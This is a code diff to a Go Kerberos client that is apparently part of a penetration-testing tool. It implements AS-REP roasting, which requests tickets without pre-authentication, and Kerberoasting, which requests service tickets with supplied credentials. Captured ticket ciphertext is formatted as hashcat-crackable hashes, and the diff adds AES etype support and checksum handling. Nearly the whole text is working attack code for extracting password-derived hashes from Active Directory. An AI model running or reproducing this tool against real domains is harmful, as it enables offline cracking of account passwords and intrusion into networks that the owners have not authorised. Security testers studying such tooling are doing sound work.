@@ -16,9 +16,17 @@ import (
 
 // RealKerberosClient implements real Kerberos protocol operations
 type RealKerberosClient struct {
-	domain     string
-	kdcAddress string
-	config     *config.Config
+	domain         string
+	kdcAddress     string
+	config         *config.Config
+	clientSAM      string
+	clientPassword string
+}
+
+// SetClientCredentials configures the principal used to obtain a TGT for Kerberoasting.
+func (k *RealKerberosClient) SetClientCredentials(sam, password string) {
+	k.clientSAM = sam
+	k.clientPassword = password
 }
 
 // NewRealKerberosClient creates a new real Kerberos client
@@ -65,38 +73,35 @@ func NewRealKerberosClient(domain, kdcAddress string) (*RealKerberosClient, erro
 func (k *RealKerberosClient) ExtractASREPHash(username string) (string, error) {
 	log.Printf("[*] Performing real AS-REP roasting for %s@%s", username, k.domain)
 
-	// Create principal name
-	principalName := types.NewPrincipalName(1, username) // 1 = KRB_NT_PRINCIPAL
+	principalName := types.NewPrincipalName(1, username)
 
-	// Create AS-REQ without pre-authentication
 	asReq, err := messages.NewASReqForTGT(k.domain, k.config, principalName)
 	if err != nil {
 		return "", fmt.Errorf("failed to create AS-REQ: %v", err)
 	}
 
-	// Remove pre-authentication data to trigger AS-REP roasting
 	asReq.PAData = types.PADataSequence{}
 
-	// Request RC4-HMAC encryption (easier to crack)
-	asReq.ReqBody.EType = []int32{int32(etypeID.RC4_HMAC)}
+	// Prefer modern etypes first, then RC4 (hashcat supports 18200 for common etypes)
+	asReq.ReqBody.EType = []int32{
+		int32(etypeID.AES256_CTS_HMAC_SHA1_96),
+		int32(etypeID.AES128_CTS_HMAC_SHA1_96),
+		int32(etypeID.RC4_HMAC),
+	}
 
-	// Send AS-REQ to KDC
 	b, err := asReq.Marshal()
 	if err != nil {
 		return "", fmt.Errorf("failed to marshal AS-REQ: %v", err)
 	}
 
-	// Send to KDC and receive response
 	rb, err := sendToKDCTCP(k.kdcAddress, b)
 	if err != nil {
 		return "", fmt.Errorf("failed to communicate with KDC: %v", err)
 	}
 
-	// Try to parse as AS-REP
 	var asRep messages.ASRep
 	err = asRep.Unmarshal(rb)
 	if err != nil {
-		// Check if it's a KRB-ERROR
 		var krbErr messages.KRBError
 		if errUnmarshal := krbErr.Unmarshal(rb); errUnmarshal == nil {
 			return "", fmt.Errorf("KDC returned error: %s (code: %d)", krbErr.EText, krbErr.ErrorCode)
@@ -104,64 +109,35 @@ func (k *RealKerberosClient) ExtractASREPHash(username string) (string, error) {
 		return "", fmt.Errorf("failed to parse AS-REP: %v", err)
 	}
 
-	// Format hash for hashcat mode 18200
 	hash := formatASREPHashForHashcat(username, k.domain, &asRep)
-
 	log.Printf("[+] Successfully extracted AS-REP hash for %s@%s", username, k.domain)
 	return hash, nil
 }
 
-// ExtractKerberoastHash performs real Kerberoasting using Kerberos protocol
-func (k *RealKerberosClient) ExtractKerberoastHash(username, spn string) (string, error) {
-	log.Printf("[*] Performing real Kerberoasting for %s@%s (SPN: %s)", username, k.domain, spn)
+// ExtractKerberoastHash requests a TGS for spn using client credentials; username is the service account SAM for hash labeling.
+func (k *RealKerberosClient) ExtractKerberoastHash(serviceAccountSAM, spn string) (string, error) {
+	log.Printf("[*] Performing real Kerberoasting for %s@%s (SPN: %s)", serviceAccountSAM, k.domain, spn)
 
-	// For Kerberoasting, we need valid credentials to get a TGT first
-	// This is a limitation - in real pentests, you'd use compromised credentials
-	// For now, we'll attempt to request the service ticket directly
-
-	// Parse SPN
-	spnParts := parseSPNComponents(spn)
-	spnPrincipal := types.PrincipalName{
-		NameType:   2, // KRB_NT_SRV_INST
-		NameString: spnParts,
+	if k.clientSAM == "" || k.clientPassword == "" {
+		return "", fmt.Errorf("Kerberoasting requires client credentials (LDAP bind user/password)")
 	}
 
-	// Create a client (this requires valid credentials in real scenarios)
-	// For testing, we'll create the TGS-REQ manually
-	cl := client.NewWithPassword(username, k.domain, "", k.config, client.DisablePAFXFAST(true))
-
-	// Request service ticket
-	tkt, key, err := cl.GetServiceTicket(spn)
+	cl := client.NewWithPassword(k.clientSAM, k.domain, k.clientPassword, k.config, client.DisablePAFXFAST(true))
+	tkt, _, err := cl.GetServiceTicket(spn)
 	if err != nil {
-		// If we can't get a ticket with credentials, try manual TGS-REQ
-		return k.extractKerberoastHashManual(username, spn, spnPrincipal)
+		return "", fmt.Errorf("GetServiceTicket failed: %w", err)
 	}
 
-	// Format hash for hashcat mode 13100
-	hash := formatKerberoastHashForHashcat(username, k.domain, spn, tkt, key)
-
-	log.Printf("[+] Successfully extracted Kerberoast hash for %s@%s", username, k.domain)
+	hash := formatKerberoastHashForHashcat(serviceAccountSAM, k.domain, spn, tkt)
+	log.Printf("[+] Successfully extracted Kerberoast hash for %s@%s", serviceAccountSAM, k.domain)
 	return hash, nil
-}
-
-// extractKerberoastHashManual attempts manual TGS-REQ without valid TGT
-func (k *RealKerberosClient) extractKerberoastHashManual(username, spn string, spnPrincipal types.PrincipalName) (string, error) {
-	// Manual TGS-REQ without a valid TGT is not possible in the Kerberos protocol
-	// The KDC requires a valid TGT to issue service tickets
-	// This will trigger fallback to simulation mode
-	return "", fmt.Errorf("TGS-REQ requires valid TGT - cannot extract hash without credentials")
 }
 
 // formatASREPHashForHashcat formats AS-REP response for hashcat mode 18200
 func formatASREPHashForHashcat(username, domain string, asRep *messages.ASRep) string {
-	// Hashcat format: $krb5asrep$23$user@domain:hash$encrypted_part
 	encType := asRep.EncPart.EType
 	cipher := asRep.EncPart.Cipher
-
-	// Convert cipher to hex
 	cipherHex := fmt.Sprintf("%x", cipher)
-
-	// Format for hashcat
 	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s",
 		encType,
 		username,
@@ -169,19 +145,27 @@ func formatASREPHashForHashcat(username, domain string, asRep *messages.ASRep) s
 		cipherHex)
 }
 
-// formatKerberoastHashForHashcat formats service ticket for hashcat mode 13100
-func formatKerberoastHashForHashcat(username, domain, spn string, tkt messages.Ticket, key types.EncryptionKey) string {
-	// Hashcat format: $krb5tgs$23$*user$realm$spn*$hash$encrypted_part
+func kerberoastChecksumLen(encType int32) int {
+	switch encType {
+	case int32(etypeID.AES256_CTS_HMAC_SHA1_96), int32(etypeID.AES128_CTS_HMAC_SHA1_96):
+		return 12
+	default:
+		return 16
+	}
+}
+
+// formatKerberoastHashForHashcat formats service ticket for hashcat (mode 13100 etype 23, 19600/19700-style for AES).
+func formatKerberoastHashForHashcat(username, domain, spn string, tkt messages.Ticket) string {
 	encType := tkt.EncPart.EType
 	cipher := tkt.EncPart.Cipher
-
-	// Convert cipher to hex
 	cipherHex := fmt.Sprintf("%x", cipher)
 
-	// Split cipher into checksum and encrypted part
-	checksumLen := 16 // For RC4-HMAC
+	checksumLen := kerberoastChecksumLen(encType)
 	if len(cipher) < checksumLen {
 		checksumLen = len(cipher) / 2
+		if checksumLen < 1 {
+			checksumLen = 1
+		}
 	}
 
 	checksum := cipherHex[:checksumLen*2]
@@ -200,17 +184,16 @@ func formatKerberoastHashForHashcat(username, domain, spn string, tkt messages.T
 func formatKerberoastHashFromTGSRep(username, domain, spn string, tgsRep *messages.TGSRep) string {
 	encType := tgsRep.Ticket.EncPart.EType
 	cipher := tgsRep.Ticket.EncPart.Cipher
-
 	cipherHex := fmt.Sprintf("%x", cipher)
-
-	checksumLen := 16
+	checksumLen := kerberoastChecksumLen(encType)
 	if len(cipher) < checksumLen {
 		checksumLen = len(cipher) / 2
+		if checksumLen < 1 {
+			checksumLen = 1
+		}
 	}
-
 	checksum := cipherHex[:checksumLen*2]
 	encPart := cipherHex[checksumLen*2:]
-
 	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
 		encType,
 		username,
@@ -222,35 +205,28 @@ func formatKerberoastHashFromTGSRep(username, domain, spn string, tgsRep *messag
 
 // parseSPNComponents parses SPN into components
 func parseSPNComponents(spn string) []string {
-	// SPN format: service/hostname or service/hostname:port
 	parts := strings.Split(spn, "/")
 	if len(parts) < 2 {
 		return []string{spn}
 	}
-
-	// Remove port if present
 	host := strings.Split(parts[1], ":")[0]
 	return []string{parts[0], host}
 }
 
 // sendToKDCTCP sends a Kerberos message to the KDC via TCP
 func sendToKDCTCP(kdcAddress string, message []byte) ([]byte, error) {
-	// Ensure port is specified
 	if !strings.Contains(kdcAddress, ":") {
 		kdcAddress = fmt.Sprintf("%s:88", kdcAddress)
 	}
 
-	// Connect to KDC using standard net package
 	conn, err := net.DialTimeout("tcp", kdcAddress, 10*time.Second)
 	if err != nil {
 		return nil, fmt.Errorf("failed to connect to KDC: %v", err)
 	}
 	defer conn.Close()
-	
-	// Set deadline for operations
+
 	conn.SetDeadline(time.Now().Add(30 * time.Second))
 
-	// Send message with length prefix (4 bytes, big-endian)
 	length := uint32(len(message))
 	lengthBytes := []byte{
 		byte(length >> 24),
@@ -267,7 +243,6 @@ func sendToKDCTCP(kdcAddress string, message []byte) ([]byte, error) {
 		return nil, fmt.Errorf("failed to send message: %v", err)
 	}
 
-	// Read response length
 	respLengthBytes := make([]byte, 4)
 	if _, err := conn.Read(respLengthBytes); err != nil {
 		return nil, fmt.Errorf("failed to read response length: %v", err)
@@ -278,7 +253,6 @@ func sendToKDCTCP(kdcAddress string, message []byte) ([]byte, error) {
 		uint32(respLengthBytes[2])<<8 |
 		uint32(respLengthBytes[3])
 
-	// Read response
 	response := make([]byte, respLength)
 	totalRead := 0
 	for totalRead < int(respLength) {
